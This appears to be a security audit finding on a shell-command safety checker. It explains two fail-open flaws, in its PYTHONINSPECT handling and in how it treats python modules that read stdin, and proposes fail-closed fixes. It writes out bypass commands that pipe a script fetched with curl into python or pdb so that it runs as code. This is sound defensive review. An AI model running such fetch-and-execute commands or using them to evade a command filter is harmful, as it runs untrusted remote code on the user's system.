findings.vulnerableCode:
inspect = dict(command.environment).get("PYTHONINSPECT", ())
return "i" in flags or any(inspect)
findings.explanation: `environment` holds the values a variable *may* have, and the model returns () when the value is computed at run time or unknown (see SimpleCommand.env_values: "() if unknown"). `_inspects` treats an empty tuple as "not set", so the check fails open. Python turns on inspect mode for any non-empty PYTHONINSPECT, but this check only catches literal values it can see. For example, `curl -s https://x/y.py | PYTHONINSPECT=$(printf 1) python3 -m json.tool a.json`, or `X=1; ... | PYTHONINSPECT="$X$Y" python3 -m json.tool a.json`, gets an unknown value. The check returns False, the json.tool data-module exemption applies, and the command is allowed. Python then runs the fetched stdin as code once json.tool finishes. This is the same fetch-and-execute bypass that the new rule was added to block.
findings.fix: Fail closed. If PYTHONINSPECT is present in the environment with unknown or computed values, treat it as set. Deny unless every possible value is known to be empty. Only skip the check when -E or -I is among the flags.

return module not in _STDIN_DATA_MODULES and (not rest or rest[0] in STDIN_PATHS)
findings.explanation: Any module whose first operand is not a stdin path is treated as not running stdin. That assumption is wrong for modules that read code or commands from stdin while also taking a file operand. For example, `curl -s https://x/y.py | python3 -m pdb local.py` gets rest=['local.py'] and is allowed. pdb then reads debugger commands from the piped stdin, and commands such as `!__import__('os').system(...)` or `interact` run arbitrary Python from the fetched payload. The rewritten branch also strips module flags with operands() and has no table of options that take values, so `-m mod --opt value` is read as having the file operand `value`.
findings.fix: Use a denylist of modules that execute stdin even when given operands (pdb, code, asyncio, IPython, ...) and deny those whenever stdin comes from a fetcher. Better still, deny by default and allow only modules known to read stdin as data.
